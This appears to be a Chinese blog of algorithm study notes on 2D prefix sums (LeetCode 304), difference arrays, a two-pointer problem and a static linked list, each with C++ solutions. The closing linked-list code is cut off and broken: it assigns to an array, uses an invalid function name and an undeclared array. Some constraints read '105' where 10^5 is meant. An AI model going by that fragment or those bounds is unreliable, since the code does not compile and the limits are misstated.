class="code"><pre><code class="hljs prolog"><span class="hljs-number">304.</span> 二维区域和检索 - 矩阵不可变<br>给定一个二维矩阵 matrix，以下类型的多个请求：<br><br>计算其子矩形范围内元素的总和，该子矩阵的 左上角 为 (row1, col1) ，右下角 为 (row2, col2) 。<br>实现 <span class="hljs-symbol">NumMatrix</span> 类：<br><br><span class="hljs-symbol">NumMatrix</span>(int[][] matrix) 给定整数矩阵 matrix 进行初始化<br>int sumRegion(int row1, int col1, int row2, int col2) 返回 左上角 (row1, col1) 、右下角 (row2, col2) 所描述的子矩阵的元素 总和 。<br> <br><br>示例 <span class="hljs-number">1</span>：<br>自己取leetcode上看吧<br>输入: <br>[<span class="hljs-string">&quot;NumMatrix&quot;</span>,<span class="hljs-string">&quot;sumRegion&quot;</span>,<span class="hljs-string">&quot;sumRegion&quot;</span>,<span class="hljs-string">&quot;sumRegion&quot;</span>]<br>[[[[<span class="hljs-number">3</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">4</span>,<span class="hljs-number">2</span>],[<span class="hljs-number">5</span>,<span class="hljs-number">6</span>,<span class="hljs-number">3</span>,<span class="hljs-number">2</span>,<span class="hljs-number">1</span>],[<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">5</span>],[<span class="hljs-number">4</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">7</span>],[<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">3</span>,<span class="hljs-number">0</span>,<span class="hljs-number">5</span>]]],[<span class="hljs-number">2</span>,<span class="hljs-number">1</span>,<span class="hljs-number">4</span>,<span class="hljs-number">3</span>],[<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">2</span>],[<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">2</span>,<span class="hljs-number">4</span>]]<br>输出: <br>[null, <span class="hljs-number">8</span>, <span class="hljs-number">11</span>, <span class="hljs-number">12</span>]<br><br>解释:<br><span class="hljs-symbol">NumMatrix</span> numMatrix = new <span class="hljs-symbol">NumMatrix</span>([[<span class="hljs-number">3</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">4</span>,<span class="hljs-number">2</span>],[<span class="hljs-number">5</span>,<span class="hljs-number">6</span>,<span class="hljs-number">3</span>,<span class="hljs-number">2</span>,<span class="hljs-number">1</span>],[<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">5</span>],[<span class="hljs-number">4</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">7</span>],[<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">3</span>,<span class="hljs-number">0</span>,<span class="hljs-number">5</span>]]);<br>numMatrix.sumRegion(<span class="hljs-number">2</span>, <span class="hljs-number">1</span>, <span class="hljs-number">4</span>, <span class="hljs-number">3</span>); // return <span class="hljs-number">8</span> (红色矩形框的元素总和)<br>numMatrix.sumRegion(<span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">2</span>); // return <span class="hljs-number">11</span> (绿色矩形框的元素总和)<br>numMatrix.sumRegion(<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">2</span>, <span class="hljs-number">4</span>); // return <span class="hljs-number">12</span> (蓝色矩形框的元素总和)<br> <br><br>提示：<br><br>m == matrix.length<br>n == matrix[i].length<br><span class="hljs-number">1</span> &lt;= m, n &lt;= <span class="hljs-number">200</span><br><span class="hljs-number">-105</span> &lt;= matrix[i][j] &lt;= <span class="hljs-number">105</span><br><span class="hljs-number">0</span> &lt;= row1 &lt;= row2 &lt; m<br><span class="hljs-number">0</span> &lt;= col1 &lt;= col2 &lt; n<br>最多调用 <span class="hljs-number">104</span> 次 sumRegion 方法<br>通过次数<span class="hljs-number">86</span>,<span class="hljs-number">115</span>提交次数<span class="hljs-number">148</span>,<span class="hljs-number">070</span><br></code></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">NumMatrix</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-type">int</span> sum[<span class="hljs-number">2000</span>][<span class="hljs-number">2000</span>];<br>    <span class="hljs-built_in">NumMatrix</span>(vector&lt;vector&lt;<span class="hljs-type">int</span>&gt;&gt;&amp; matrix) &#123;<br>       <span class="hljs-type">int</span> n=matrix.<span class="hljs-built_in">size</span>(),m=matrix[<span class="hljs-number">0</span>].<span class="hljs-built_in">size</span>();<span class="hljs-comment">//获得vector数组的列数和每行长度</span><br>       <span class="hljs-keyword">if</span>(n&gt;<span class="hljs-number">0</span>)&#123;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">1</span>;i&lt;=n;i++)<br>            <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j=<span class="hljs-number">1</span>;j&lt;=m;j++)<br>                sum[i][j]=sum[i<span class="hljs-number">-1</span>][j]+sum[i][j<span class="hljs-number">-1</span>]-sum[i<span class="hljs-number">-1</span>][j<span class="hljs-number">-1</span>]+matrix[i<span class="hljs-number">-1</span>][j<span class="hljs-number">-1</span>];<span class="hljs-comment">//最后matrix[i-1][j-1]是因为我们是从i=1,j=1开始，但是原数组是从i=0,j=0开始</span><br>       &#125;<br>    &#125;<br>    <br>    <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">sumRegion</span><span class="hljs-params">(<span class="hljs-type">int</span> row1, <span class="hljs-type">int</span> col1, <span class="hljs-type">int</span> row2, <span class="hljs-type">int</span> col2)</span> </span>&#123;<br>        <span class="hljs-keyword">return</span> sum[row2+<span class="hljs-number">1</span>][col2+<span class="hljs-number">1</span>]-sum[row1][col2+<span class="hljs-number">1</span>]-sum[row2+<span class="hljs-number">1</span>][col1]+sum[row1][col1];<br>    &#125;<br>&#125;;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * Your NumMatrix object will be instantiated and called as such:</span><br><span class="hljs-comment"> * NumMatrix* obj = new NumMatrix(matrix);</span><br><span class="hljs-comment"> * int param_1 = obj-&gt;sumRegion(row1,col1,row2,col2);</span><br><span class="hljs-comment"> */</span><br></code></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">NumMatrix</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    vector&lt;vector&lt;<span class="hljs-type">int</span>&gt;&gt; sum;<span class="hljs-comment">//vector数组</span><br>    <span class="hljs-built_in">NumMatrix</span>(vector&lt;vector&lt;<span class="hljs-type">int</span>&gt;&gt;&amp; matrix) &#123;<br>       <span class="hljs-type">int</span> n=matrix.<span class="hljs-built_in">size</span>(),m=matrix[<span class="hljs-number">0</span>].<span class="hljs-built_in">size</span>();<span class="hljs-comment">//获得原数组的列数和每行长度</span><br>       <span class="hljs-keyword">if</span>(n&gt;<span class="hljs-number">0</span>)&#123;<br>        sum.<span class="hljs-built_in">resize</span>(n+<span class="hljs-number">1</span>,<span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;(m+<span class="hljs-number">1</span>,<span class="hljs-number">0</span>));<span class="hljs-comment">//多加一行和一列，从第一行和第一列开始</span><br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">1</span>;i&lt;=n;i++)<br>            <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j=<span class="hljs-number">1</span>;j&lt;=m;j++)<br>                sum[i][j]=sum[i<span class="hljs-number">-1</span>][j]+sum[i][j<span class="hljs-number">-1</span>]-sum[i<span class="hljs-number">-1</span>][j<span class="hljs-number">-1</span>]+matrix[i<span class="hljs-number">-1</span>][j<span class="hljs-number">-1</span>];<span class="hljs-comment">//最后matrix[i-1][j-1]是因为我们是从i=1,j=1开始，但是原数组是从i=0,j=0开始</span><br>       &#125;<br>    &#125;<br>    <br>    <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">sumRegion</span><span class="hljs-params">(<span class="hljs-type">int</span> row1, <span class="hljs-type">int</span> col1, <span class="hljs-type">int</span> row2, <span class="hljs-type">int</span> col2)</span> </span>&#123;<br>        <span class="hljs-keyword">return</span> sum[row2+<span class="hljs-number">1</span>][col2+<span class="hljs-number">1</span>]-sum[row1][col2+<span class="hljs-number">1</span>]-sum[row2+<span class="hljs-number">1</span>][col1]+sum[row1][col1];<br>    &#125;<br>&#125;;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * Your NumMatrix object will be instantiated and called as such:</span><br><span class="hljs-comment"> * NumMatrix* obj = new NumMatrix(matrix);</span><br><span class="hljs-comment"> * int param_1 = obj-&gt;sumRegion(row1,col1,row2,col2);</span><br><span class="hljs-comment"> */</span><br></code></pre></td></tr></table></figure><h1 id="差分"><a href="#差分" class="headerlink" title="差分"></a>差分</h1><h2 id="一维差分"><a href="#一维差分" class="headerlink" title="一维差分"></a>一维差分</h2><p><a href="https://www.acwing.com/solution/content/26588/">详细知识链接</a></p><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs tap">输入一个长度为 n 的整数序列。<br><br>接下来输入 m 个操作，每个操作包含三个整数 l,r,c，表示将序列中 [l,r] 之间的每个数加上 c。<br><br>请你输出进行完所有操作后的序列。<br><br>输入格式<br>第一行包含两个整数 n 和 m。<br><br>第二行包含 n 个整数，表示整数序列。<br><br>接下来 m 行，每行包含三个整数 l，r，c，表示一个操作。<br><br>输出格式<br>共一行，包含 n 个整数，表示最终序列。<br><br>数据范围<br>1≤n,m≤100000,<br>1≤l≤r≤n,<br>−1000≤c≤1000,<br>−1000≤整数序列中元素的值≤1000<br>输入样例：<br>6 3<br>1<span class="hljs-number"> 2 </span>2<span class="hljs-number"> 1 </span>2 1<br>1<span class="hljs-number"> 3 </span>1<br>3<span class="hljs-number"> 5 </span>1<br>1<span class="hljs-number"> 6 </span>1<br>输出样例：<br>3<span class="hljs-number"> 4 </span>5<span class="hljs-number"> 3 </span>4 2<br></code></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><span class="hljs-type">const</span> <span class="hljs-type">int</span> N=<span class="hljs-number">1e5</span>+<span class="hljs-number">10</span>;<br><span class="hljs-type">int</span> a[N],b[N];<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    ios::<span class="hljs-built_in">sync_with_stdio</span>(<span class="hljs-literal">false</span>);<br>    <span class="hljs-type">int</span> n,m;<br>    cin&gt;&gt;n&gt;&gt;m;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">1</span>;i&lt;=n;i++) cin&gt;&gt;a[i];<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">1</span>;i&lt;=n;i++) b[i]=a[i]-a[i<span class="hljs-number">-1</span>];<br>    <span class="hljs-keyword">while</span>(m--)<br>    &#123;<br>        <span class="hljs-type">int</span> l,r,c;<br>        cin&gt;&gt;l&gt;&gt;r&gt;&gt;c;<br>        b[l]+=c;<br>        b[r+<span class="hljs-number">1</span>]-=c;<br>    &#125;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">1</span>;i&lt;=n;i++) a[i]=a[i<span class="hljs-number">-1</span>]+b[i];<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">1</span>;i&lt;=n;i++) cout&lt;&lt;a[i]&lt;&lt;<span class="hljs-string">&quot; &quot;</span>;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>y总版</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><span class="hljs-type">const</span> <span class="hljs-type">int</span> N=<span class="hljs-number">1e5</span>+<span class="hljs-number">10</span>;<br><span class="hljs-type">int</span> a[N],b[N];<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">insert</span><span class="hljs-params">(<span class="hljs-type">int</span> l,<span class="hljs-type">int</span> r,<span class="hljs-type">int</span> c)</span></span><br><span class="hljs-function"></span>&#123;<br>    b[l]+=c;<br>    b[r+<span class="hljs-number">1</span>]-=c;<br>&#125;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">int</span> n,m;<br>    cin&gt;&gt;n&gt;&gt;m;<br>    ios::<span class="hljs-built_in">sync_with_stdio</span>(<span class="hljs-literal">false</span>);<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">1</span>;i&lt;=n;i++) cin&gt;&gt;a[i];<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">1</span>;i&lt;=n;i++) <span class="hljs-built_in">insert</span>(i,i,a[i]);<span class="hljs-comment">//插入每一个数，并再下一个数后减去该数，在进行b[i]+=b[i-1]时就可以得到b[i]</span><br>    <span class="hljs-keyword">while</span>(m--)<br>    &#123;<br>        <span class="hljs-type">int</span> l,r,c;<br>        cin&gt;&gt;l&gt;&gt;r&gt;&gt;c;<br>        <span class="hljs-built_in">insert</span>(l,r,c);<br>    &#125;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">1</span>;i&lt;=n;i++) b[i]+=b[i<span class="hljs-number">-1</span>];<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">1</span>;i&lt;=n;i++) cout&lt;&lt;b[i]&lt;&lt;<span class="hljs-string">&quot; &quot;</span>;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="二维差分"><a href="#二维差分" class="headerlink" title="二维差分"></a>二维差分</h2><p><a href="https://www.acwing.com/solution/content/27325/">二维差分知识点</a></p><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs tap">798. 差分矩阵<br>   题目<br>   提交记录<br>   讨论<br>   题解<br>   视频讲解<br><br>输入一个 n 行 m 列的整数矩阵，再输入 q 个操作，每个操作包含五个整数 x1,y1,x2,y2,c，其中 (x1,y1) 和 (x2,y2) 表示一个子矩阵的左上角坐标和右下角坐标。<br><br>每个操作都要将选中的子矩阵中的每个元素的值加上 c。<br><br>请你将进行完所有操作后的矩阵输出。<br><br>输入格式<br>第一行包含整数 n,m,q。<br><br>接下来 n 行，每行包含 m 个整数，表示整数矩阵。<br><br>接下来 q 行，每行包含<span class="hljs-number"> 5 </span>个整数 x1,y1,x2,y2,c，表示一个操作。<br><br>输出格式<br>共 n 行，每行 m 个整数，表示所有操作进行完毕后的最终矩阵。<br><br>数据范围<br>1≤n,m≤1000,<br>1≤q≤100000,<br>1≤x1≤x2≤n,<br>1≤y1≤y2≤m,<br>−1000≤c≤1000,<br>−1000≤矩阵内元素的值≤1000<br>输入样例：<br>3<span class="hljs-number"> 4 </span>3<br>1<span class="hljs-number"> 2 </span>2 1<br>3<span class="hljs-number"> 2 </span>2 1<br>1<span class="hljs-number"> 1 </span>1 1<br>1<span class="hljs-number"> 1 </span>2<span class="hljs-number"> 2 </span>1<br>1<span class="hljs-number"> 3 </span>2<span class="hljs-number"> 3 </span>2<br>3<span class="hljs-number"> 1 </span>3<span class="hljs-number"> 4 </span>1<br>输出样例：<br>2<span class="hljs-number"> 3 </span>4 1<br>4<span class="hljs-number"> 3 </span>4 1<br>2<span class="hljs-number"> 2 </span>2 2<br></code></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><span class="hljs-type">const</span> <span class="hljs-type">int</span> N=<span class="hljs-number">1e3</span>+<span class="hljs-number">10</span>;<br><span class="hljs-type">int</span> a[N][N],b[N][N],matrix[N][N];<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">int</span> n,m,q;<br>    cin&gt;&gt;n&gt;&gt;m&gt;&gt;q;<br>    ios::<span class="hljs-built_in">sync_with_stdio</span>(<span class="hljs-literal">false</span>);<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">1</span>;i&lt;=n;i++) <br>      <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j=<span class="hljs-number">1</span>;j&lt;=m;j++)<br>         cin&gt;&gt;a[i][j];<br>    <span class="hljs-keyword">while</span>(q--)<br>    &#123;<br>        <span class="hljs-type">int</span> x1,y1,x2,y2,c;<br>        cin&gt;&gt;x1&gt;&gt;y1&gt;&gt;x2&gt;&gt;y2&gt;&gt;c;<br>        b[x1][y1]+=c;<span class="hljs-comment">//进行二维差分运算</span><br>        b[x2+<span class="hljs-number">1</span>][y1]-=c;<br>        b[x1][y2+<span class="hljs-number">1</span>]-=c;<br>        b[x2+<span class="hljs-number">1</span>][y2+<span class="hljs-number">1</span>]+=c;<br>    &#125;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">1</span>;i&lt;=n;i++)<br>      <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j=<span class="hljs-number">1</span>;j&lt;=m;j++)<br>        matrix[i][j]=matrix[i<span class="hljs-number">-1</span>][j]+matrix[i][j<span class="hljs-number">-1</span>]+b[i][j]-matrix[i<span class="hljs-number">-1</span>][j<span class="hljs-number">-1</span>];<span class="hljs-comment">/*算出全部子矩阵加减操作后的前缀和*/</span><br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">1</span>;i&lt;=n;i++)&#123;<br>      <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j=<span class="hljs-number">1</span>;j&lt;=m;j++)<br>      &#123;<br>            cout&lt;&lt;a[i][j]+matrix[i][j]&lt;&lt;<span class="hljs-string">&quot; &quot;</span>;<span class="hljs-comment">/*将操作后的前缀和与原数组相加得到答案*/</span><br>      &#125;<br>      cout&lt;&lt;endl;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="双指针算法"><a href="#双指针算法" class="headerlink" title="双指针算法"></a>双指针算法</h1><p>找双指针算法可以先写一个暴力的o(n^2)，然后找i和j是否满足单调性，如果满足就可以使用双指针算法</p><figure class="highlight excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs excel"><span class="hljs-number">799</span>. 最长连续不重复子序列<br>   题目<br>   提交记录<br>   讨论<br>   题解<br>   视频讲解<br><br>给定一个长度为 <span class="hljs-built_in">n</span> 的整数序列，请找出最长的不包含重复的数的连续区间，输出它的长度。<br><br>输入格式<br>第一行包含整数 <span class="hljs-built_in">n</span>。<br><br>第二行包含 <span class="hljs-built_in">n</span> 个整数（均在 <span class="hljs-number">0</span>∼<span class="hljs-number">105</span> 范围内），表示整数序列。<br><br>输出格式<br>共一行，包含一个整数，表示最长的不包含重复的数的连续区间的长度。<br><br>数据范围<br><span class="hljs-number">1</span>≤<span class="hljs-built_in">n</span>≤<span class="hljs-number">105</span><br>输入样例：<br><span class="hljs-number">5</span><br><span class="hljs-number">1</span> <span class="hljs-number">2</span> <span class="hljs-number">2</span> <span class="hljs-number">3</span> <span class="hljs-number">5</span><br>输出样例：<br><span class="hljs-number">3</span><br></code></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><span class="hljs-type">const</span> <span class="hljs-type">int</span> N=<span class="hljs-number">1e5</span>+<span class="hljs-number">10</span>;<br><span class="hljs-type">int</span> a[N],s[N];<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    ios::<span class="hljs-built_in">sync_with_stdio</span>(<span class="hljs-literal">false</span>);<br>    <span class="hljs-type">int</span> n;<br>    cin&gt;&gt;n;<br>    <span class="hljs-type">int</span> res=<span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;n;i++) cin&gt;&gt;a[i];<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>,j=<span class="hljs-number">0</span>;i&lt;n;i++)<br>    &#123;<br>        s[a[i]]++;<span class="hljs-comment">//相当于选中当前当前这个数</span><br>        <span class="hljs-comment">//为啥可以只查找A[i]是否重复，因为前面已经是连续不重复了，重复只能在a[i]</span><br>        <span class="hljs-keyword">while</span>(s[a[i]]&gt;<span class="hljs-number">1</span>)<span class="hljs-comment">//如果有重复，j开始查找，直到查找到没有没有数和a[i]重复为止</span><br>        &#123;<br>            s[a[j]]--;<span class="hljs-comment">//右移相当于当前这个选中状态被取消要减去1；</span><br>            j++;<br>        &#125;<br>        res=<span class="hljs-built_in">max</span>(res,i-j+<span class="hljs-number">1</span>);<br>    &#125;<br>    cout&lt;&lt;res&lt;&lt;endl;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="静态链表"><a href="#静态链表" class="headerlink" title="静态链表"></a>静态链表</h1><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><span class="hljs-type">const</span> <span class="hljs-type">int</span> N=<span class="hljs-number">1e5</span>;<br><span class="hljs-type">int</span> val[N],ne[N],head[N],idx;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">init</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    head=<span class="hljs-number">-1</span>;<br>    idx=<span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-comment">//插头</span><br><span class="hljs-type">void</span> add-to-<span class="hljs-built_in">head</span>(<span class="hljs-type">int</span> x)<br>&#123;<br>    e[idx]=x;<br>    